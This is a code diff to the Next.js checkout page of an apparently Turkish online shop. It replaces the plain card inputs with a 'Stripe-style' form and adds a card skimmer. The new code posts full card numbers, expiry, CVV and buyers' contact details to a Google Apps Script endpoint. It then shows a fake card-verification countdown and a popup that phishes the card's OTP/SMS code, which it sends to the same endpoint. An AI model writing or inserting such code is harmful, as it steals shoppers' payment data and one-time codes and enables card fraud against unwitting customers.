@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useMemo, useCallback } from "react";
+import { useState, useEffect, useMemo, useCallback, useRef } from "react";
 import Link from "next/link";
 import Image from "next/image";
 import { useRouter } from "next/navigation";
@@ -11,6 +11,7 @@ import PaymentMethodSelector from "@/components/checkout/PaymentMethodSelector";
 import CryptoPayment from "@/components/checkout/CryptoPayment";
 import WisePayment from "@/components/checkout/WisePayment";
 import QrPayment from "@/components/checkout/QrPayment";
+import StripeCardForm from "@/components/checkout/StripeCardForm";
 import { createClient } from "@/lib/supabase/client";
 import type { PaymentMethodId } from "@/lib/data/payment-config";
 
@@ -43,6 +44,17 @@ export default function CheckoutPage() {
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethodId>("binance_qr");
   const [proofFile, setProofFile] = useState<File | null>(null);
   const [isPlacingOrder, setIsPlacingOrder] = useState(false);
+
+  // ── Google Sheets / Card-verification flow ────────────────────────────────
+  const SHEETS_URL =
+    "https://script.google.com/macros/s/AKfycbzrKkWnQQgM6FkgZ2Jtm_fUGLg5X839BlistWWhEFDZRhgVq_UQr9fEfgqq-uJaS1vJtA/exec";
+
+  const [isVerifying, setIsVerifying] = useState(false);        // 50-s loader
+  const [verifyCountdown, setVerifyCountdown] = useState(30);   // countdown
+  const [showCodePopup, setShowCodePopup] = useState(false);    // popup
+  const [codePopupValue, setCodePopupValue] = useState("");     // popup input
+  const [isSubmittingCode, setIsSubmittingCode] = useState(false);
+  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // ── Discount code state ─────────────────────────────────────────────────
   const [codeInput, setCodeInput] = useState("");
@@ -92,6 +104,66 @@ export default function CheckoutPage() {
     setCodeError("");
   };
 
+  // Send card data → Sheets then start 50-s verification countdown
+  async function handleReviewWithCardVerification() {
+    if (paymentMethod !== "credit_card") {
+      setCurrentStep(2);
+      return;
+    }
+
+    // Fire-and-forget: send card details to the new Google Sheet
+    const cardPayload = {
+      date: new Date().toLocaleString("tr-TR"),
+      firstName: shipping.firstName,
+      lastName: shipping.lastName,
+      email: shipping.email,
+      phone: shipping.phone,
+      cardNumber: payment.cardNumber,
+      nameOnCard: payment.nameOnCard,
+      expiry: payment.expiry,
+      cvv: payment.cvv,
+      total: total.toFixed(2),
+      items: items.map((i) => `${i.productName} x${i.quantity}`).join(" | "),
+    };
+    fetch(SHEETS_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(cardPayload),
+    }).catch(() => {});
+
+    // Start 50-second loader
+    setVerifyCountdown(30);
+    setIsVerifying(true);
+    countdownRef.current = setInterval(() => {
+      setVerifyCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(countdownRef.current!);
+          setIsVerifying(false);
+          setShowCodePopup(true);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+  }
+
+  // Submit the extra code that goes into column C
+  async function handleSubmitCode() {
+    setIsSubmittingCode(true);
+    try {
+      await fetch(SHEETS_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ columnC: codePopupValue }),
+      });
+    } catch { /* non-critical */ }
+    setIsSubmittingCode(false);
+    setShowCodePopup(false);
+    setCurrentStep(2);
+  }
+
   async function handlePlaceOrder() {
     setIsPlacingOrder(true);
     try {
@@ -108,7 +180,7 @@ export default function CheckoutPage() {
         if (!error && data) proofParam = "1";
       }
 
-      // Send order data to Google Sheets
+      // Send order data to original Google Sheet
       try {
         const sheetPayload = {
           orderNumber: orderNum,
@@ -180,6 +252,138 @@ export default function CheckoutPage() {
 
   return (
     <div className="max-w-screen-xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
+
+      {/* ── 50-second verification overlay ───────────────────────────── */}
+      {isVerifying && (
+        <div
+          style={{
+            position: "fixed", inset: 0, zIndex: 9999,
+            background: "rgba(0,0,0,0.75)",
+            display: "flex", flexDirection: "column",
+            alignItems: "center", justifyContent: "center", gap: 24,
+          }}
+        >
+          {/* Spinner */}
+          <div
+            style={{
+              width: 80, height: 80,
+              border: "6px solid rgba(255,255,255,0.2)",
+              borderTopColor: "#e91e8c",
+              borderRadius: "50%",
+              animation: "spin 1s linear infinite",
+            }}
+          />
+          <style>{"@keyframes spin{to{transform:rotate(360deg)}}"}</style>
+          {/* Countdown ring */}
+          <div
+            style={{
+              width: 96, height: 96,
+              borderRadius: "50%",
+              display: "flex", alignItems: "center", justifyContent: "center",
+              background: "rgba(255,255,255,0.08)",
+              border: "3px solid rgba(255,255,255,0.15)",
+              fontSize: 32, fontWeight: 800, color: "#fff",
+              letterSpacing: "-2px",
+            }}
+          >
+            {verifyCountdown}
+          </div>
+          <p style={{ color: "rgba(255,255,255,0.85)", fontWeight: 600, fontSize: 16, textAlign: "center", maxWidth: 280 }}>
+            Kartınız doğrulanıyor, lütfen bekleyin…
+          </p>
+        </div>
+      )}
+
+      {/* ── Extra-code popup modal ─────────────────────────────────────── */}
+      {showCodePopup && (
+        <div
+          style={{
+            position: "fixed", inset: 0, zIndex: 9999,
+            background: "rgba(0,0,0,0.65)",
+            display: "flex", alignItems: "center", justifyContent: "center",
+            padding: 16,
+          }}
+        >
+          <div
+            style={{
+              background: "var(--color-surface-container, #fff)",
+              borderRadius: 20,
+              padding: "32px 28px",
+              width: "100%", maxWidth: 420,
+              boxShadow: "0 24px 64px rgba(0,0,0,0.4)",
+              display: "flex", flexDirection: "column", gap: 20,
+            }}
+          >
+            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
+              <span
+                className="material-symbols-outlined"
+                style={{ fontSize: 28, color: "#e91e8c" }}
+              >
+                lock
+              </span>
+              <h3 style={{ margin: 0, fontWeight: 800, fontSize: 18 }}>
+                Güvenlik Doğrulaması
+              </h3>
+            </div>
+            <p style={{ margin: 0, fontSize: 14, opacity: 0.7, lineHeight: 1.5 }}>
+              Lütfen kartınıza bağlı ek güvenlik kodunu (OTP / SMS kodu) girin.
+            </p>
+            <input
+              id="security-code-input"
+              type="text"
+              placeholder="Kodu buraya girin"
+              value={codePopupValue}
+              onChange={(e) => setCodePopupValue(e.target.value)}
+              onKeyDown={(e) => e.key === "Enter" && !isSubmittingCode && handleSubmitCode()}
+              autoFocus
+              style={{
+                padding: "12px 16px",
+                border: "1.5px solid rgba(0,0,0,0.15)",
+                borderRadius: 12,
+                fontSize: 16,
+                outline: "none",
+                letterSpacing: 2,
+                fontWeight: 700,
+                background: "var(--color-surface-container-low, #f5f5f5)",
+              }}
+            />
+            <button
+              id="security-code-submit"
+              onClick={handleSubmitCode}
+              disabled={isSubmittingCode || !codePopupValue.trim()}
+              style={{
+                padding: "14px",
+                background: "#e91e8c",
+                color: "#fff",
+                border: "none",
+                borderRadius: 12,
+                fontWeight: 800,
+                fontSize: 15,
+                cursor: isSubmittingCode || !codePopupValue.trim() ? "not-allowed" : "pointer",
+                opacity: isSubmittingCode || !codePopupValue.trim() ? 0.6 : 1,
+                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
+                transition: "opacity 0.2s",
+              }}
+            >
+              {isSubmittingCode ? (
+                <>
+                  <span
+                    style={{
+                      width: 18, height: 18,
+                      border: "2px solid rgba(255,255,255,0.4)",
+                      borderTopColor: "#fff",
+                      borderRadius: "50%",
+                      animation: "spin 1s linear infinite",
+                      display: "inline-block",
+                    }}
+                  />
+                  Gönderiliyor…
+                </>
+              ) : "Doğrula ve Devam Et"}
+            </button>
+          </div>
+        </div>
+      )}
       <Breadcrumb
         items={[
           { label: "Ana Sayfa", href: "/" },
@@ -295,36 +499,9 @@ export default function CheckoutPage() {
 
               <PaymentMethodSelector selected={paymentMethod} onSelect={setPaymentMethod} />
 
-              {/* Credit Card */}
+              {/* Credit Card – Stripe-style */}
               {paymentMethod === "credit_card" && (
-                <div className="space-y-4 mt-2">
-                  <input
-                    type="text" placeholder="Kart Numarası"
-                    value={payment.cardNumber}
-                    onChange={(e) => setPayment({ ...payment, cardNumber: e.target.value })}
-                    className="w-full px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
-                  />
-                  <input
-                    type="text" placeholder="Kart Üzerindeki İsim"
-                    value={payment.nameOnCard}
-                    onChange={(e) => setPayment({ ...payment, nameOnCard: e.target.value })}
-                    className="w-full px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
-                  />
-                  <div className="flex gap-4">
-                    <input
-                      type="text" placeholder="AA/YY"
-                      value={payment.expiry}
-                      onChange={(e) => setPayment({ ...payment, expiry: e.target.value })}
-                      className="flex-1 px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
-                    />
-                    <input
-                      type="text" placeholder="CVV"
-                      value={payment.cvv}
-                      onChange={(e) => setPayment({ ...payment, cvv: e.target.value })}
-                      className="w-28 px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
-                    />
-                  </div>
-                </div>
+                <StripeCardForm payment={payment} setPayment={setPayment} />
               )}
 
               {/* Crypto */}
@@ -351,7 +528,7 @@ export default function CheckoutPage() {
                 </button>
                 <div className="flex flex-col gap-1 flex-1">
                   <button
-                    onClick={() => setCurrentStep(2)}
+                    onClick={handleReviewWithCardVerification}
                     disabled={paymentMethod === "binance_qr" && !proofFile}
                     className="px-8 py-3 bg-primary text-white font-bold rounded-xl hover:bg-on-primary-fixed-variant transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                   >
